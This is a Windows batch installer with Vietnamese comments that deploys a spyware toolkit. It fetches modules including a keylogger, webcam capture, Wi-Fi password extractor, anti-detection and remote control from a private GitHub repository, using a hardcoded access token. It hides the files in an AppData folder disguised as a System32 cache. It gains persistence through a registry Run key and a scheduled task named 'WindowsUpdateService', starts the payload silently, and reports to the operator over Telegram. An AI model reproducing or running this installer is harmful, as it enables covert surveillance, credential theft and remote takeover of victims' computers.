@echo off
REM ========================================
REM INSTALLER TỰ ĐỘNG - REPO PRIVATE
REM ========================================
REM File này sẽ tự động:
REM 1. Tải tất cả file từ GitHub Private Repo
REM 2. Cài đặt thư viện Python
REM 3. Ẩn thư mục và file
REM 4. Thêm vào Windows Startup
REM 5. Khởi động ứng dụng
REM ========================================

REM Chạy bình thường - hiển thị thông báo
chcp 65001 >nul 2>&1
cls
echo ========================================
echo    CAI DAT TU DONG
echo ========================================
echo.

REM ========================================
REM CẤU HÌNH GITHUB - THAY ĐỔI Ở ĐÂY
REM ========================================
set "GITHUB_USER=truongxoantit"
set "GITHUB_REPO=TLe1"
set "GITHUB_TOKEN=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"
REM ========================================
REM Lấy token tại: https://github.com/settings/tokens
REM Cần quyền: repo (Full control of private repositories)
REM ========================================

REM Kiểm tra Python
python --version >nul 2>&1
if errorlevel 1 (
    py --version >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] Python chua duoc cai dat!
        echo Vui long cai dat Python tu https://www.python.org/downloads/
        echo.
        pause
        exit /b 1
    ) else (
        set "PYTHON_CMD=py"
    )
) else (
    set "PYTHON_CMD=python"
)
echo [OK] Tim thay Python

REM Tạo thư mục cài đặt
set "INSTALL_DIR=%APPDATA%\Microsoft\Windows\System32Cache"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
if not exist "%INSTALL_DIR%\temp" mkdir "%INSTALL_DIR%\temp" >nul 2>&1

cd /d "%INSTALL_DIR%" >nul 2>&1

REM Kiểm tra curl
curl --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Curl chua duoc cai dat!
    echo Windows 10/11 co san curl, neu khong co vui long cai dat.
    pause
    exit /b 1
)

REM Tải tất cả file từ GitHub Private Repo
echo [1/5] Dang tai file tu GitHub...
echo.

REM Danh sách file cần tải
set "FILES=main_stealth.py screen_recorder.py keylogger.py telegram_sender.py file_manager.py stealth.py hotkey_listener.py internet_checker.py performance_optimizer.py anti_detection.py updater.py data_manager.py clipboard_monitor.py screenshot_capture.py file_collector.py process_monitor.py machine_id.py remote_control.py file_receiver.py wifi_extractor.py webcam_capture.py usb_monitor.py config.py requirements.txt"

REM Tải từng file
set "FAILED=0"
for %%f in (%FILES%) do (
    echo Dang tai %%f...
    curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "%%f" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/%%f" >nul 2>&1
    if errorlevel 1 (
        echo [WARNING] Khong the tai %%f
        set "FAILED=1"
    )
)

REM Kiểm tra file quan trọng
if not exist "main_stealth.py" (
    echo [ERROR] Khong the tai main_stealth.py!
    echo Kiem tra lai GITHUB_TOKEN hoac ket noi internet.
    pause
    exit /b 1
)

if not exist "config.py" (
    echo [ERROR] Khong the tai config.py!
    echo Kiem tra lai GITHUB_TOKEN hoac ket noi internet.
    pause
    exit /b 1
)

if "%FAILED%"=="1" (
    echo [WARNING] Mot so file khong the tai, nhung se tiep tuc...
    echo.
)

REM Cài đặt thư viện Python
echo [2/5] Dang cai dat thu vien Python...
echo Dang nang cap pip...
%PYTHON_CMD% -m pip install --upgrade pip --quiet --disable-pip-version-check >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Khong the nang cap pip, tiep tuc...
)
echo Dang cai dat thu vien tu requirements.txt...
%PYTHON_CMD% -m pip install -r requirements.txt --quiet --disable-pip-version-check
if errorlevel 1 (
    echo [WARNING] Co loi khi cai dat thu vien, nhung se tiep tuc...
    echo.
)

REM Ẩn thư mục và file
echo [3/5] Dang an thu muc va file...
attrib +h +s "%INSTALL_DIR%" >nul 2>&1
for %%f in ("%INSTALL_DIR%\*.py") do attrib +h "%%f" >nul 2>&1

REM Thêm vào Windows Startup (Registry)
echo [4/5] Dang them vao Windows Startup...
%PYTHON_CMD% -c "import winreg; import sys; key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE); winreg.SetValueEx(key, 'WindowsUpdateService', 0, winreg.REG_SZ, f'\"{sys.executable}\" \"%INSTALL_DIR%\\main_stealth.py\"'); winreg.CloseKey(key)" >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Khong the them vao Registry, thu cach khac...
)

REM Tạo task scheduler (backup)
schtasks /create /tn "WindowsUpdateService" /tr "\"%INSTALL_DIR%\main_stealth.py\"" /sc onlogon /f /rl highest >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Khong the tao Task Scheduler, nhung Registry da duoc them...
)

REM Kiểm tra cài đặt thành công
if exist "%INSTALL_DIR%\main_stealth.py" (
    if exist "%INSTALL_DIR%\config.py" (
        echo [5/5] Dang khoi dong ung dung...
        echo.
        start "" /min pythonw "%INSTALL_DIR%\main_stealth.py" >nul 2>&1
        timeout /t 2 >nul 2>&1
        echo ========================================
        echo    CAI DAT THANH CONG!
        echo ========================================
        echo.
        echo Thu muc cai dat: %INSTALL_DIR%
        echo Ung dung da duoc them vao Windows Startup
        echo Ung dung da duoc khoi dong!
        echo.
        echo Kiem tra Telegram de xem thong bao ket noi tu may nay.
        echo.
        echo Nhan phim bat ky de dong...
        pause
    ) else (
        echo [ERROR] Khong tim thay config.py
        pause
        exit /b 1
    )
) else (
    echo [ERROR] Khong tim thay main_stealth.py
    pause
    exit /b 1
)

exit /b 0
